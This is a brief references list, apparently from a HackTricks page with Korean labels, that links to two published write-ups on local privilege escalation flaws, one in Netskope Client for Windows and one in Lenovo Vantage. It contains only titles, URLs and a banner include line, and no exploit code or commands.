- [14] [AmberWolf – Netskope Client for Windows의 CVE-2025-0309 fix 우회](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Lenovo Vantage의 Privilege Escalation Bugs 분석](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
